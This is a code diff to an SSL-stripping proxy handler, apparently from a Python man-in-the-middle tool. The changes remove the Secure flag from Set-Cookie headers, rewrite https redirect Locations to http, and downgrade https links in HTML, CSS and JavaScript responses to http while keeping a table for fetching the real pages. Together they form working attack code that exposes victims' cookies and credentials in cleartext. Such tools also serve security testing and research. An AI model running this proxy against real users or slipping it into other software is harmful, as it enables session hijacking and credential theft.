@@ -12,15 +12,15 @@ class SSLStripProxyHandler(SimpleHTTPProxyHandler):
             req.path = self.forward_table[req.path]
 
     def response_handler(self, req, res, body):
+        set_cookie = res.headers.get('Set-Cookie')
+        if set_cookie:
+            res.headers['Set-Cookie'] = re.sub(r';\s*Secure', '', set_cookie, flags=re.IGNORECASE)
+
         location = res.headers.get('Location', '')
         if location.startswith('https://'):
-            http_url = "http://" + location[len('https://'):]
+            http_url = re.sub(r'^https://', 'http://', location)
             self.forward_table[http_url] = location
-
-            req.command = 'GET'
-            req.path = location
-            self.do_SPAM()
-            return True
+            res.headers['Location'] = http_url
         else:
             replaced_body = self.ssl_response_handler(req, res, body)
             if replaced_body is True:
@@ -31,9 +31,11 @@ class SSLStripProxyHandler(SimpleHTTPProxyHandler):
             content_type = res.headers.get('Content-Type', '')
             if content_type.startswith('text/html') or content_type.startswith('text/css') or content_type.startswith('text/javascript'):
                 re_url = r'((["\'])\s*)https://([\w\-.~%!$&\'()*+,;=:@/?#]+)(\s*\2)'    # based on RFC 3986
-                for m in re.finditer(re_url, body):
-                    self.forward_table["http://%s" % m.group(3)] = "https://%s" % m.group(3)
-                body = re.sub(re_url, r'\1http://\3\4', body)
+                def replace_method(m):
+                    raw_path = m.group(3).replace('&amp;', '&')
+                    self.forward_table['http://' + raw_path] = 'https://' + raw_path
+                    return '%shttp://%s%s' % (m.group(1), m.group(3), m.group(4))
+                body = re.sub(re_url, replace_method, body)
 
             return body
 
